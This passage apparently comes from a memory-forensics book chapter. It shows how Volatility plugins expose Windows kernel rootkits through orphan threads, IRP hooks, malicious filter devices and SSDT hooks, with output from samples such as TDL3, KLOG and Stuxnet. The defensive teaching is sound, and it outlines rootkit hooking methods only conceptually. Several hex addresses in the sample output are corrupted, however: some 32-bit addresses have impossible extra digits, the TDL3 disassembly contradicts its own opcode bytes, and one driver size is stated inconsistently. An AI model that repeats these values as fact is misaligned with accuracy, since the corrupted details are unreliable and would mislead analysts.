0xfffff88002a3c000 tcpipreg.sys         OK: driver.fffff88002a3c000.sys
```

Although the regular expression search is convenient, remember that there are occasions when you’ll have no name upon which to deploy a search (for example, if the metadata structures are overwritten or if you’ve found a PE header in an anonymous kernel pool allocation). In these cases, you can supply the base address (where you see the MZ signature) and `moddump` will perform the extraction. The following example assumes that a PE file exists at `0xfffff88003800000`:

```
$ python vol.py –f memory.dmp
     --profile=Win7SP1x64 moddump 
     --base=0xfffff88003800000 
     --dump-dir=OUTDIR/
 
Volatility Foundation Volatility Framework 2.4 
Module Base        Module Name          Result
------------------ -------------------- ------
0xfffff88003800000 UNKNOWN           OK: driver.fffff88003800000.sys
```

If you plan to load the extracted module into IDA Pro for static analysis, remember one thing: the `ImageBase` address in the PE header needs to be changed to match its real load address in kernel memory. In other words, you should use `0xfffff88003800000` for the last example shown. Here’s how you can do it using the `pefile` Python module from [https://code.google.com/p/pefile](https://code.google.com/p/pefile):

```
$ python
Python 2.7.6 (v2.7.6:3a1db0d2747e, Nov 10 2013, 00:42:54) 
[GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> import pefile
>>> pe = pefile.PE("driver.0xfffff88003800000.sys", fast_load = True)
>>> pe.OPTIONAL_HEADER.ImageBase = 0xfffff88003800000
>>> pe.write("driver.0xfffff88003800000.sys")
>>> quit()
```

This simple fix gives IDA Pro the additional context it needs to properly display relative function calls, jumps, and string references. Depending on the state of the binary’s import address table, you may also need to use Volatility’s `impscan` plugin to generate labels that you can apply to the IDA database. You’ll see an example of using `impscan` later in the chapter (also see “Recipe 16-8: Scanning for Imported Functions with ImpScan” in the *Malware Analyst’s Cookbook*).

## Threads in Kernel Mode

When kernel modules create new threads with `PsCreateSystemThread`, the `System` process (PID 4 on XP and later) becomes the owner of the thread. In other words, the `System` process is the default home for threads that start in kernel mode. You can explore this fact with Process Explorer and see that the starting addresses for threads owned by the `System` process are offsets into kernel modules such as `ACPI.sys` and `HTTP.sys` (see [Figure 13-3](#figure13-3)).

![c13f003.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c13/c13f003.png)

*[**Figure 13-3:**](#figureanchor13-3) Threads that start in kernel mode are owned by the System process.*

When parsing through a memory dump, you can distinguish these system threads from others based on the following factors:

- The `_ETHREAD.SystemThread` value is 1.
- The `_ETHREAD.CrossThreadFlags` member has the `PS_CROSS_THREAD_FLAGS_SYSTEM` flag set.
- The owning process is PID 4.

This information can help you find malware families, such as Mebroot and Tigger, that attempt to hide their presence in the kernel. When the rootkit modules initially load, they allocate a pool of kernel memory, copy executable code to the pool, and call PsCreateSystemThread to begin executing the new code block. After the thread is created, the module can unload. These actions help the rootkit remain stealthy because it survives based on threads running from untagged pools of memory. However, this creates a rather obvious artifact for forensics because you have a thread with a starting address pointing to an unknown area of kernel memory, in which no known module exists.

### Tigger’s Kernel Threads

[Figure 13-4](#figure13-4) shows the threads owned by the `System` process of a machine infected with Tigger. You can see the presence of four new threads that did not exist in [Figure 13-3](#figure13-3). Process Explorer just shows the thread’s start address instead of the normal format, such as `driverName.sys+0xabcd`, because the start address does not fall within the memory range of any loaded modules.

![c13f004.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c13/c13f004.png)

*[**Figure 13-4:**](#figureanchor13-4) Process Explorer shows four new threads with no known kernel module.*

### Detecting Orphan Threads

The `threads` plugin can help you identify attempts to hide in the described manner. It enumerates loaded modules by walking the doubly linked list and records their base addresses and sizes. Then it scans for system threads and checks whether the `_ETHREAD.StartAddress` value is within the range of one of the modules. If the plugin cannot pair a thread with its owning driver, it assumes that the thread is detached or hidden. For this reason, the threads have also become known as orphan threads. The following output shows how orphan threads appear in memory dumps. You’ll see the `OrphanThread` tag displayed as well as an `UNKNOWN` to the right of the starting address (`0xf2edd150`).

```
$ python vol.py -f orphan.vmem threads -F OrphanThread
     --profile=WinXPSP3x86
[snip] 

ETHREAD: 0xff1f92b0 Pid: 4 Tid: 1648
Tags: OrphanThread,SystemThread
Created: 2010-08-15 19:26:13 
Exited: 1970-01-01 00:00:00 
Owning Process: System
Attached Process: System
State: Waiting:DelayExecution
BasePriority: 0x8
Priority: 0x8
TEB: 0x00000000
StartAddress: 0xf2edd150 UNKNOWN
ServiceTable: 0x80552180
  [0] 0x80501030
  [1] 0x00000000
  [2] 0x00000000
  [3] 0x00000000
Win32Thread: 0x00000000
CrossThreadFlags: PS_CROSS_THREAD_FLAGS_SYSTEM
```

If you suspect a kernel rootkit exists on the system you’re investigating, but you can’t find supporting evidence with the `modules` or `modscan` plugins, we recommend checking for orphan threads. However, keep in mind that the thread’s starting address will point at a function *inside* the malicious PE file, rather than at the PE file’s base address. Thus, you may need to do some calculation to find the MZ signature. Near the end of the chapter, you’ll see a `volshell` script that can scan backward from a given address to find the first valid PE header.

---

**WARNING**

Rootkits can easily bypass the orphan thread detection technique by patching the `_ETHREAD.StartAddress` values to point at a known driver. In their VB2008 presentation ([http://www.virusbtn.com/pdf/conference_slides/2008/Kasslin-Florio-VB2008.pdf](http://www.virusbtn.com/pdf/conference_slides/2008/Kasslin-Florio-VB2008.pdf)), Kimmo Kasslin and Elia Floria noted that the third generation of Mebroot started applying these patches to increase its stealth.

---

## Driver Objects and IRPs

Typically, when a kernel module loads, in addition to the creation of a `KLDR_DATA_TABLE_ENTRY` structure, a corresponding `_DRIVER_OBJECT` is also initialized. This is important because the driver object contains critical information about its kernel module, such as a copy of the module’s base address, its unload routine, and pointers to the list of handler functions. This information can help you locate malicious modules when the metadata structures described thus far in the chapter are unlinked or corrupted. Furthermore, by finding the driver objects, you can check for hooks in the handler routines.

To provide a little more background, applications in Windows communicate with drivers by sending I/O Request Packets (IRPs). An IRP is a data structure that includes an integer to identify the desired operation (create, read, write, and so on) and buffers for any data to be read or written by the driver. Each driver object has a table of 28 function pointers that it can register to handle the different operations. The driver usually configures this table, known as the major function table or IRP function table, in its entry point routine right after being loaded. The following output shows that the table of 28 pointers, named `MajorFunction`, is part of every driver object:

```
>>> dt("_DRIVER_OBJECT")
'_DRIVER_OBJECT' (336 bytes)
0x0   : Type                           ['short']
0x2   : Size                           ['short']
0x8   : DeviceObject                   ['pointer64', ['_DEVICE_OBJECT']]
0x10  : Flags                          ['unsigned long']
0x18  : DriverStart                    ['pointer64', ['void']]
0x20  : DriverSize                     ['unsigned long']
0x28  : DriverSection                  ['pointer64', ['void']]
0x30  : DriverExtension                ['pointer64', ['_DRIVER_EXTENSION']]
0x38  : DriverName                     ['_UNICODE_STRING']
0x48  : HardwareDatabase               ['pointer64', ['_UNICODE_STRING']]
0x50  : FastIoDispatch                 ['pointer64', ['_FAST_IO_DISPATCH']]
0x58  : DriverInit                     ['pointer64', ['void']]
0x60  : DriverStartIo                  ['pointer64', ['void']]
0x68  : DriverUnload                   ['pointer64', ['void']]
0x70  : MajorFunction                  ['array', 28, ['pointer64', ['void']]]
```

---

## **Key Points**

Your key points are these:

- `DeviceObject`: A pointer to the *first* device created by the driver. If a driver creates more than one device, they’re associated with a linked list. For example, the TCP/IP driver creates devices named `RawIp`, `Udp`, `Tcp`, and `Ip`.
- DriverStart: A copy of the kernel module’s base address.
- `DriverSize`: The size, in bytes, of the kernel module described by the driver object.
- `DriverExtension`: Points to a structure with a `ServiceKeyName` member, which tells you the path within the registry that stores this driver’s configuration.
- `DriverName`: This is the name of the driver object, such as `\Driver\Tcpip` or `\Driver\HTTP`.
- `DriverInit`: A pointer to the driver’s initialization routine.
- `DriverUnload`: A pointer to the function that executes when the driver unloads, typically for freeing resources created by the driver.
- `MajorFunction`: The array of 28 major function pointers. By overwriting an index in this array, rootkits can hook certain operations.

---

### Scanning for Driver Objects

The Volatility `driverscan` command finds driver objects by pool tag scanning. Here’s an example of its output:

```
$ python vol.py -f memory.dmp --profile=Win7SP1x64 driverscan
Volatility Foundation Volatility Framework 2.4 
Offset(P)          Start                  Size Service Key  Driver Name
------------------ ------------------ -------- ------------ -----------
0x000000000038ac80 0xfffff88003bd9000   0xf000 mouclass     \Driver\mouclass
0x00000000254eaa80 0xfffff88000e00000  0x15000 volmgr       \Driver\volmgr
0x00000000254eae40 0xfffff88000fba000   0xd000 vdrvroot     \Driver\vdrvroot
0x000000003e0c10f060 0xfffff8800323c000  0x20000 BthPan       \Driver\BthPan
0x000000003e416060 0xffffc88f002c70e000  0x18000 rspndr       \Driver\rspndr
0x000000003e474e70 0xfffff8800364c000  0x2d000 mrxsmb       \FileSystem\mrxsmb
0x000000003c47e065d0 0xfffff8800284d000  0x24000 mrxsmb20     \FileSystem\mrxsmb2
[snip]
```

The physical offset of the `_DRIVER_OBJECT` structure displays in the far-left column. Then you see the starting address of the driver in kernel memory in the `Start` column. To give you an idea of how this can be useful, the address you see for `\Driver\mouclass` should match the base address for `mouclass.sys` shown by the `modules` or `modscan` plugins. Thus, if malware hides or erases the `KLDR_DATA_TABLE_ENTRY`, there’s still a `_DRIVER_OBJECT` with just as much (if not more) information on which modules are loaded on a system.

### Hooking and Hook Detection

Rootkits can hook entries in a driver’s IRP function table. For example, by overwriting the `IRP_MJ_WRITE` function in a driver’s IRP table, a rootkit can inspect the buffer of data to be written across the network, to disk, or even to a printer. Another commonly seen example is hooking `IRP_MJ_DEVICE_CONTROL` for `tcpip.sys`. When you use `netstat.exe` or SysInternals `TcpView.exe` on a live system, it determines active connections and sockets using this communication channel. Thus, by hooking it, rootkits can easily hide network activity.

To detect IRP function hooks, you just need to find the `_DRIVER_OBJECT` structures in memory, read the 28 values in the `MajorFunction` array, and determine where they point. Although it is all automated by the `driverirp` plugin, as you’ll soon see, it doesn’t definitively tell you which entries are hooked; it still requires some analysis and interpretation on your part. That’s because there are legitimate cases in which a driver will forward its handler to another driver, causing the appearance of a hook.

Here’s an example of the `driverirp` plugin’s output for the `Tcpip` driver on a clean 64-bit system:

```
$ python vol.py -f memory.dmp --profile=Win7SP1x64 driverirp -r tcpip
Volatility Foundation Volatility Framework 2.4 

--------------------------------------------------
DriverName: Tcpip
DriverStart: 0xfffff880016bb000
DriverSize: 0x204000
DriverStartIo: 0x0
   0 IRP_MJ_CREATE                        0xfffff880017a1070 tcpip.sys
   1 IRP_MJ_CREATE_NAMED_PIPE             0xfffff800028b81d4 ntoskrnl.exe
   2 IRP_MJ_CLOSE                         0xfffff880017a1070 tcpip.sys
   3 IRP_MJ_READ                          0xfffff800028b81d4 ntoskrnl.exe
   4 IRP_MJ_WRITE                         0xfffff800028b81d4 ntoskrnl.exe
   5 IRP_MJ_QUERY_INFORMATION             0xfffff800028b81d4 ntoskrnl.exe
   6 IRP_MJ_SET_INFORMATION               0xfffff800028b81d4 ntoskrnl.exe
   7 IRP_MJ_QUERY_EA                      0xfffff800028b81d4 ntoskrnl.exe
   8 IRP_MJ_SET_EA                        0xfffff800028b81d4 ntoskrnl.exe
   9 IRP_MJ_FLUSH_BUFFERS                 0xfffff800028b81d4 ntoskrnl.exe
  10 IRP_MJ_QUERY_VOLUME_INFORMATION      0xfffff800028b81d4 ntoskrnl.exe
  11 IRP_MJ_SET_VOLUME_INFORMATION        0xfffff800028b81d4 ntoskrnl.exe
  12 IRP_MJ_DIRECTORY_CONTROL             0xfffff800028b81d4 ntoskrnl.exe
  13 IRP_MJ_FILE_SYSTEM_CONTROL           0xfffff800028b81d4 ntoskrnl.exe
  14 IRP_MJ_DEVICE_CONTROL                0xfffff880016dafd0 tcpip.sys
  15 IRP_MJ_INTERNAL_DEVICE_CONTROL       0xfffff880017a1070 tcpip.sys
[snip]
```

The `Tcpip` driver starts at `0xfffff880016bb000` and occupies `0x20400` bytes. Most of its handlers either point at a function within `tcpip.sys` (self-handled operations) or at another module (forwarded operations). Rather than leaving the pointers zero/null, if a driver doesn’t intend to handle certain operations, it points the IRP at `nt!IopInvalidDeviceRequest`, which is just a dummy function in the NT module that acts as a fall-through (like a default case in a C switch statement).

Here’s an example of a 32-bit XP machine in which the `Tcpip` driver’s `IRP_MJ_DEVICE_CONTROL` routine has actually been hooked:

```
$ python vol.py -f hooker.bin --profile=WinXPSP3x86 driverirp -r tcpip
Volatility Foundation Volatility Framework 2.4 

--------------------------------------------------
DriverName: Tcpip
DriverStart: 0xb2ec30f000
DriverSize: 0x58480
DriverStartIo: 0x0
   0 IRP_MJ_CREATE                        0xb2ef94f9 tcpip.sys
   1 IRP_MJ_CREATE_NAMED_PIPE             0xb2ef94f9 tcpip.sys
[snip]
  12 IRP_MJ_DIRECTORY_CONTROL             0xb2ef94f9 tcpip.sys
  13 IRP_MJ_FILE_SYSTEM_CONTROL           0xb2ef94f9 tcpip.sys
  14 IRP_MJ_DEVICE_CONTROL                0xf8b615d0 url.sys
  15 IRP_MJ_INTERNAL_DEVICE_CONTROL       0xb2ec97f018 tcpip.sys
  16 IRP_MJ_SHUTDOWN                      0xb2ef94f9 tcpip.sys
[snip]
```

Notice that the handler points at a function inside `url.sys`, which is not a normal system driver. In this case, you could dump `url.sys` from memory and reverse-engineer it to figure exactly what network sockets and connections it’s attempting to filter on the live machine.

### Stealthy Hooks

TDL3 is an example of a rootkit that defeats the common method of IRP hooks detection. In the following output, all the IRP handlers for `vmscsi.sys` lead to a function that at first glance appears to indicate that there is no forwarding or hooking for the request. In particular, they all point to `0xf9db9cbd`, which is within the range of the `vmscsi.sys` driver’s memory.

```
$ python vol.py -f tdl3.vmem driverirp -r vmscsi
      --profile=WinXPSP3x86
Volatility Foundation Volatility Framework 2.4 
--------------------------------------------------
DriverName: vmscsi
DriverStart: 0xf9db8000
DriverSize: 0x2c00
DriverStartIo: 0xf97ea40e
   0 IRP_MJ_CREATE                        0xf9db9cbd vmscsi.sys
   1 IRP_MJ_CREATE_NAMED_PIPE             0xf9db9cbd vmscsi.sys
   2 IRP_MJ_CLOSE                         0xf9db9cbd vmscsi.sys
   3 IRP_MJ_READ                          0xf9db9cbd vmscsi.sys
   4 IRP_MJ_WRITE                         0xf9db9cbd vmscsi.sys
   5 IRP_MJ_QUERY_INFORMATION             0xf9db9cbd vmscsi.sys
   6 IRP_MJ_SET_INFORMATION               0xf9db9cbd vmscsi.sys
   7 IRP_MJ_QUERY_EA                      0xf9db9cbd vmscsi.sys
   8 IRP_MJ_SET_EA                        0xf9db9cbd vmscsi.sys
[snip]
```

Consider the diagram in [Figure 13-5](#figure13-5), which illustrates how the TDL3 rootkit can still gain control over all operations intended for the `vmscsi.sys` driver.

![c13f005.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c13/c13f005.png)

*[**Figure 13-5:**](#figureanchor13-5) TDL3 evades IRP hook detection by using a redirector stub inside the victim driver.*

The diagram shows that normal rootkits overwrite IRP table entries and point them outside of the owning driver’s memory. TDL3, on the other hand, writes a small code block in the memory of the owning driver (`vmscsi.sys` in this case), which it uses as a launching point to jump to the rootkit code. In this scenario, the IRP functions still point inside `vmscsi.sys`, making it very difficult to determine if the driver has been compromised. By using the `--verbose` flag to `driverirp` or by using the `volshell` plugin to disassemble the handler function, you’ll see that it just contains the following:

```
0xf9db9cbd a10803dfff       MOV EAX, [0xffdc03f008]
0xf9db9cc2 ffa0fc000000     JMP DWORD [EAX+0xfc]
0xf9db9cc8 0000             ADD [EAX], AL
0xf9db9cca 0000             ADD [EAX], AL
0xf9db9ccc 0000             ADD [EAX], AL
0xf9db9cce 0000             ADD [EAX], AL
```

The first instruction dereferences a pointer at `0xffdc03f008`. Then the CPU is redirected via a `JMP` instruction to an address that’s located at offset `0xFC` from the pointer in `EAX`. You can easily follow these hops in `volshell` as shown here:

```
 >>> dd(0xffdc03f008, length=4)
ffdc03f008  817ef908

>>> dd(0x817ef908 + 0xFC, length=4)
817efa04  81926e31

>>> dis(0x81926e31)
0x81926e31 55                               PUSH EBP
0x81926e32 8bec                             MOV EBP, ESP
0x81926e34 8b450c                           MOV EAX, [EBP+0xc]
0x81926e37 8b4d08                           MOV ECX, [EBP+0x8]
0x81926e3a 83ec0c                           SUB ESP, 0xc
0x81926e3d 53                               PUSH EBX
0x81926e3e 8b5860                           MOV EBX, [EAX+0x60]
0x81926e41 a10803dfff                       MOV EAX, [0xffdc03f008]
0x81926e46 3b4808                           CMP ECX, [EAX+0x8]
[snip]
```

At this point, you know the rootkit’s real code occupies the area around `0x81926e31`. Regardless of how the rootkit hides, remember that it always has to remain functional. This one’s functionality involved hooking IRPs, and by following the hooks, you were taken straight to the body of the malicious module.

### High Value Targets

There are hundreds of drivers on a typical system, so you cannot possibly analyze all 28 major function pointers for each driver, especially if they’re using stealthy hooking techniques. Our recommendation is that you focus on the highest-value targets. For example, attackers will be interested in the `IRP_MJ_READ` and `IRP_MJ_WRITE` of file system drivers. Additionally, they’ll be interested in the `IRP_MJ_DEVICE_CONTROL` for networking drivers such as `\Driver\Tcpip`, `\Driver\NDIS`, and `\Driver\HTTP`.

## Device Trees

Windows uses a layered (or stacked) architecture for handling I/O requests. In other words, multiple drivers can handle the same IRP. This layered approach has its advantages—it permits transparent file system archiving and encryption (such as EFS), as well as the capability for firewall products to filter network connections. However, it also provides yet another way for a malicious driver to interact with data that it shouldn’t be accessing. For example, instead of hooking a target driver’s IRP function, as previously described, a rootkit can just insert, or attach, to the target device’s stack. In this manner, the rootkit’s driver receives a copy of the IRP, which it can log or modify before the legitimate driver receives it.

[Figure 13-6](#figure13-6) shows a simplified diagram of how a rootkit can exploit the layered driver architecture. The point is that the malicious driver takes a position in the stack so that it can “inspect” the requested operation regardless of where the request originates. In this case, it attached to the ATA driver’s stack (`atapi.sys`) and filtered attempts to write to specific sectors of the hard disk. In this manner, it doesn’t matter whether an application in user mode or an antivirus driver in kernel mode tries to delete a protected file; the rootkit driver still gets the opportunity to block or drop the request.

![c13f006.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c13/c13f006.png)

*[**Figure 13-6:**](#figureanchor13-6) A malicious filter driver can inspect, log, and/or prevent attempts to read or write from the disk*

---

## **Data Structures**

To engage in the described behavior, a driver first creates a named or unnamed device of a specific type (i.e., file system device, network device) by calling `IoCreateDevice`. The returned value of this function becomes the *source* device object. The driver then obtains a pointer to the *target* device object using `IoGetDeviceObjectPointer`. It passes both device objects to `IoAttachDeviceToDeviceStack`, which completes the setup. The source device can now receive IRPs intended for the target device. Alternately, `IoAttachDevice` can be used in a similar manner. The following code shows a device object for Windows 7 64-bit:

```
>>> dt("_DEVICE_OBJECT")
'_DEVICE_OBJECT' (184 bytes)
0x0   : Type                           ['short']
0x2   : Size                           ['unsigned short']
0x4   : ReferenceCount                 ['long']
0x8   : DriverObject                   ['pointer', ['_DRIVER_OBJECT']]
0xc   : NextDevice                     ['pointer', ['_DEVICE_OBJECT']]
0x10  : AttachedDevice                 ['pointer', ['_DEVICE_OBJECT']]
0x14  : CurrentIrp                     ['pointer', ['_IRP']]
[snip]
0x28  : DeviceExtension                ['pointer', ['void']]
0x2c  : DeviceType                     ['unsigned long']
[snip]
0xb0  : DeviceObjectExtension          ['pointer', ['_DEVOBJ_EXTENSION']]
0xb4  : Reserved                       ['pointer', ['void']]
```

## **Key Points**

Your key points are these:

- `DriverObject`: A pointer back to the device’s own driver.
- `NextDevice`: A singly linked list of other devices created by the same driver.
- `AttachedDevice`: A singly linked list of devices (typically created by other drivers) that are attached to this stack.
- `CurrentIrp`: The current IRP being processed by this device.
- `DeviceExtension`: An opaque (undefined) member that can store any type of custom data structures and configuration data that a device requires. For example, the Truecrypt driver stores the master encryption keys within its device’s extension.
- `DeviceType`: Specifies the type of device; for example, `FILE_DEVICE_KEYBOARD`, `FILE_DEVICE_NETWORK`, or `FILE_DEVICE_DISK`.

---

### Auditing Device Trees

To audit device trees, you can use the `devicetree` plugin. This plugin’s output shows you that the drivers on the outer edge of the tree (DRV) and their devices (DEV) are indented one level. Any attached devices (ATT) are further indented. When analyzing the output, you should first focus on the most critical device types (network, keyboard, and disk) because those are the ones attackers commonly target.

Here is an example of a memory dump infected with the proof of concept KLOG rootkit, which attaches to the keyboard device to receive copies of the user’s keystrokes:

```
$ python vol.py -f klog.dmp --profile=Win2003SP1x86 devicetree

DRV 0x01f89310 \Driver\klog
---| DEV 0x81d2d730 (?) FILE_DEVICE_KEYBOARD

[snip]

DRV 0x02421770 \Driver\Kbdclass
---| DEV 0x81e96030 KeyboardClass1 FILE_DEVICE_KEYBOARD
---| DEV 0x822211e0 KeyboardClass0 FILE_DEVICE_KEYBOARD
------| ATT 0x81d2d730 (?) - \Driver\klog FILE_DEVICE_KEYBOARD

[snip]
```

KLOG created a driver named `\Driver\klog` and then it created an unnamed device, indicated by `(?)`, of type `FILE_DEVICE_KEYBOARD` and attached it to the `KeyboardClass0` device owned by `\Driver\Kbdclass`. You will see a similar effect if you install the Ctrl2cap utility from SysInternals ([http://technet.microsoft.com/en-us/sysinternals/bb897578.aspx](http://technet.microsoft.com/en-us/sysinternals/bb897578.aspx)) because it uses the same layered driver approach to convert caps-lock characters into control characters.

### Stuxnet’s Malicious Devices

The next example shows modifications made to the system by the Stuxnet kernel driver (`\Driver\MRxNet`):

```
$ python vol.py -f stuxnet.mem devicetree

DRV 0x0205e5a8 \FileSystem\vmhgfs
---| DEV 0x820c00f030 hgfsInternal UNKNOWN
---| DEV 0x821a1030 HGFS FILE_DEVICE_NETWORK_FILE_SYSTEM
------| ATT 0x81f5d020 (?) - \FileSystem\FltMgr FILE_DEVICE_NETWORK_FILE_SYSTEM
---------| ATT 0x821354b8 (?) - \Driver\MRxNet FILE_DEVICE_NETWORK_FILE_SYSTEM

DRV 0x023ae880 \FileSystem\MRxSmb
---| DEV 0x81da95d0 LanmanDatagramReceiver FILE_DEVICE_NETWORK_BROWSER
---| DEV 0x81ec50e030 LanmanRedirector FILE_DEVICE_NETWORK_FILE_SYSTEM
------| ATT 0x81bc10f020 (?) - \FileSystem\FltMgr FILE_DEVICE_NETWORK_FILE_SYSTEM
---------| ATT 0x81f0fc58 (?) - \Driver\MRxNet FILE_DEVICE_NETWORK_FILE_SYSTEM

DRV 0x02476da0 \FileSystem\Cdfs
---| DEV 0x81e636c8 Cdfs FILE_DEVICE_CD_ROM_FILE_SYSTEM
------| ATT 0x81fac548 (?) - \FileSystem\FltMgr FILE_DEVICE_CD_ROM_FILE_SYSTEM
---------| ATT 0x8226ef10 (?) - \Driver\MRxNet FILE_DEVICE_CD_ROM_FILE_SYSTEM

DRV 0x0253d180 \FileSystem\Ntfs
---| DEV 0x82166020  FILE_DEVICE_DISK_FILE_SYSTEM
------| ATT 0x8228c6b0 (?) - \FileSystem\sr FILE_DEVICE_DISK_FILE_SYSTEM
---------| ATT 0x81f47020 (?) - \FileSystem\FltMgr FILE_DEVICE_DISK_FILE_SYSTEM
------------| ATT 0x81fb9680 (?) - \Driver\MRxNet FILE_DEVICE_DISK_FILE_SYSTEM
```

The unnamed device created by `\Driver\MRxNet` is the outermost device attached to the `vmhgfs` (VMware Host to Guest File System), `MRxSmb` (SMB), `Cdfs`, and `Ntfs` file system drivers. Now Stuxnet can filter or hide specifically named files and directories on those file systems.

## Auditing the SSDT

A System Service Descriptor Table (SSDT) contains pointers to kernel mode functions. As shown in [Figure 13-7](#figure13-7), when applications in user mode request system services, such as writing to a file or creating a process, a small stub in `ntdll.dll` (or other user mode library) assists the calling thread in entering kernel mode in a controlled manner. The transition is accomplished by issuing an `INT 0x2E` instruction in Windows 2000 or by using `SYSENTER` in XP and later. Both methods first end up in a function named `KiSystemService`, which looks up the address of the requested kernel function in the SSDT. The lookup is index-based because the call tables are arrays of pointers.

![c13f007.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c13/c13f007.png)

*[**Figure 13-7:**](#figureanchor13-7) A high-level diagram showing the role of the SSDT in dispatching system calls*

The order and total number of functions in the SSDT differ across operating system versions. For example, `NtUnloadDriver` can be found at index 0x184 on Windows 7 64-bit, but it is 0x1A1 on Windows 8 64-bit. Also, note that there is more than one call table on every system. The first and most well-known table stores native API functions that the kernel executive module provides (`ntoskrnl.exe`, `ntkrnlpa.exe`, etc.). The second table, known as the shadow SSDT, stores GUI functions provided by `win32k.sys`. As shown in [Figure 13-7](#figure13-7), the other two tables are unused by default unless you’re running an IIS server—in which case the third one is used by `spud.sys` (the IIS service driver).

---

## **Data Structures**

The code that follows shows the relevant data structures for a 64-bit Windows 7 system. The `nt!KeServiceDescriptorTable` and `nt!KeServiceDescriptorTableShadow` symbols are both instances of `_SERVICE_DESCRIPTOR_TABLE` that contain up to four descriptors (entries). Each descriptor has a `KiServiceTable` member that points to the array of functions, and `ServiceLimit` specifies how many functions exist in the array.

```
>>> dt("_SERVICE_DESCRIPTOR_TABLE")
'_SERVICE_DESCRIPTOR_TABLE' (64 bytes)
0x0   : Descriptors       ['array', 4, ['_SERVICE_DESCRIPTOR_ENTRY']]

>>> dt("_SERVICE_DESCRIPTOR_ENTRY")
'_SERVICE_DESCRIPTOR_ENTRY' (32 bytes)
0x0  : KiServiceTable     ['pointer', ['void']]
0x8  : CounterBaseTable   ['pointer', ['unsigned long']]
0x10 : ServiceLimit       ['unsigned long']
0x18 : ArgumentTable      ['pointer', ['unsigned char']]
```

---

### Enumerating the SSDT

To enumerate the SSDT in Windows memory dumps, you can use the `ssdt` plugin. Due to changes between 32- and 64-bit versions, the plugin finds the SSDT data in entirely different ways, but the format of the output is consistent. Specifically, on 32-bit Windows, we enumerate all thread objects and gather the unique values for the `_ETHREAD.Tcb.ServiceTable` member. This member doesn’t exist on 64-bit platforms, so instead we disassemble the exported `nt!KeAddSystemServiceTable` function and extract the relative virtual addresses (RVAs) for the `KeServiceDescriptorTable` and `KeServiceDescriptorTableShadow` symbols, as shown in [Figure 13-8](#figure13-8).

![c13f008.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c13/c13f008.png)

*[**Figure 13-8:**](#figureanchor13-8) The RVAs of the SSDT and Shadow SSDT are accessible from the KeAddSystemServiceTable API.*

Here’s how the `ssdt` plugin’s output appears on a clean 64-bit Windows 7 machine:

```
$ python vol.py -f memory.dmp --profile=Win7SP1x64 ssdt
Volatility Foundation Volatility Framework 2.4 

[x64] Gathering all referenced SSDTs from KeAddSystemServiceTable...
Finding appropriate address space for tables...

SSDT[0] at fffff800028dc300 with 401 entries
  Entry 0x0000: 0xfffff80002ce9ca0 (NtMapUser[snip]) owned by ntoskrnl.exe
  Entry 0x0001: 0xfffff80002bd18c0 (NtWaitForSingleObject) owned by ntoskrnl.exe
  Entry 0x0002: 0xfffff800028d31a0 (NtCallbackReturn) owned by ntoskrnl.exe
  Entry 0x0003: 0xfffff80002bc4a80 (NtReadFile) owned by ntoskrnl.exe
  Entry 0x0004: 0xfffff80002bf67a0 (NtDeviceIoControlFile) owned by ntoskrnl.exe
  Entry 0x0005: 0xfffff80002bed9a0 (NtWriteFile) owned by ntoskrnl.exe
  Entry 0x0006: 0xfffff80002b97c90 (NtRemoveIoCompletion) owned by ntoskrnl.exe
  [snip]

SSDT[1] at fffff960001a1f00 with 827 entries
  Entry 0x1000: 0xfffff96000195974 (NtUserGetThreadState) owned by win32k.sys
  Entry 0x1001: 0xfffff96000192a50 (NtUserPeekMessage) owned by win32k.sys
  Entry 0x1002: 0xfffff960001a3f6c (NtUserCallOneParam) owned by win32k.sys
  Entry 0x1003: 0xfffff960001b211c (NtUserGetKeyState) owned by win32k.sys
  Entry 0x1004: 0xfffff960001ab500 (NtUserInvalidateRect) owned by win32k.sys
  Entry 0x1005: 0xfffff960001a4164 (NtUserCallNoParam) owned by win32k.sys
  Entry 0x1006: 0xfffff9600019b990 (NtUserGetMessage) owned by win32k.sys
  Entry 0x1007: 0xfffff9600017ffb0 (NtUserMessageCall) owned by win32k.sys
  [snip]
```

As shown, the table at `0xfffff800028dc300` is `SSDT[0]` or the first descriptor in the `_SERVICE_DESCRIPTOR_TABLE.Descriptors` array. In other words, this table is for the native APIs exported by the NT module. The table at `0xfffff960001a1f00` is `SSDT[1]` (the second descriptor), which tells you that it is the table for GUI subsystem APIs. All functions shown appear to be owned by the proper module (either the NT module or `win32k.sys`).

### Attacking the SSDT

There are several different ways to attack the system call dispatching architecture. We list the methods next, along with a description of how you can use memory forensics to detect the attacks.

#### Pointer Replacement

This method involves overwriting pointers in the SSDT to hook individual functions. To do this, you typically need the base address of the call table in kernel memory and the index of the function that you want to hook. You have several ways to find the call table, but malware often leverages `MmGetSystemRoutineAddress` (the kernel version of `GetProcAddress`) and locates the `KeServiceDescriptorTable` symbol, which is exported by the NT module. It then references the `ServiceTable` member. You’ll often see the `InterlockedExchange` API used to perform the actual pointer replacement.

All addresses in the native function table should point inside the NT module, and all addresses in the GUI function table should point inside `win32k.sys`. Detecting SSDT hooks is simple in this regard because you can just check each of the entries and determine whether they point at the right module. Here’s a malware sample that hooks various functions and points them at a module named `lanmandrv.sys`. You can filter the results using `egrep -v` to exclude the legitimate modules:

---

**NOTE**

Remember that the name of the NT module may not always be `ntoskrnl.exe`. It could be `ntkrnlpa.exe` or `ntkrnlmp.exe`, so make sure to adjust your regular expression accordingly.

---

```
$ python vol.py -f laqma.vmem ssdt --profile=WinXPSP3x86 
      | egrep -v '(ntoskrnl\.exe|win32k\.sys)'
Volatility Foundation Volatility Framework 2.4 

[x86] Gathering all referenced SSDTs from KTHREADs...
Finding appropriate address space for tables...

SSDT[0] at 805011fc with 284 entries
  Entry 0x0049: 0xf8c52884 (NtEnumerateValueKey) owned by lanmandrv.sys
  Entry 0x007a: 0xf8c5253e (NtOpenProcess) owned by lanmandrv.sys
  Entry 0x0091: 0xf8c52654 (NtQueryDirectoryFile) owned by lanmandrv.sys
  Entry 0x00ad: 0xf8c52544 (NtQuerySystemInformation) owned by lanmandrv.sys
```

